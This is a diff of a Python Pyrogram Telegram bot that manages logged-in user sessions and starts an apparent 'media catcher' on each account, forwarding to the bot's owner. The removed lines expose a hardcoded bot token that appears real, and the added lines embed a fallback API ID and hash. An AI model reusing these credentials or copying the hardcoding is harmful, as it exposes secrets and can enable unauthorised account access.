@@ -3,10 +3,13 @@ import os
 import json
 from pyrogram import Client, filters, types, errors
 from pyromod import listen
+from dotenv import load_dotenv
 
-BOT_TOKEN = "8233324744:AAGo9itQBd0h_tqtefbjPXJg0r4jtprKHl8"
-API_ID = 1234567 
-API_HASH = "your_hash" 
+load_dotenv()
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+API_ID = int(os.getenv("API_ID", "2040"))
+API_HASH = os.getenv("API_HASH", "b18441a1ff607e10c989891a5462e627")
 
 bot = Client("bot_manager", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
@@ -51,7 +54,7 @@ async def start_media_catcher(user_client, phone, owner_id):
 
 @bot.on_message(filters.command("start"))
 async def start_cmd(client, message):
-    await message.reply("اهلا وسهلا بالبوت المصم\nبدون غلط", reply_markup=main_keyboard)
+    await message.reply("اهلا وسهلا بالبوت المصمم\nبدون غلط", reply_markup=main_keyboard)
 
 @bot.on_message(filters.text & filters.regex("📱 اضف رقم"))
 async def add_session(client, message):
@@ -156,7 +159,7 @@ async def main():
         try:
             await cli.start()
             active_sessions[p] = {"client": cli, "status": v["status"], "api_id": v["api_id"], "api_hash": v["api_hash"]}
-            asyncio.create_task(start_media_catcher(cli, p, 1234567))
+            asyncio.create_task(start_media_catcher(cli, p, bot.me.id))
         except: pass
     await asyncio.sleep(float('inf'))
 
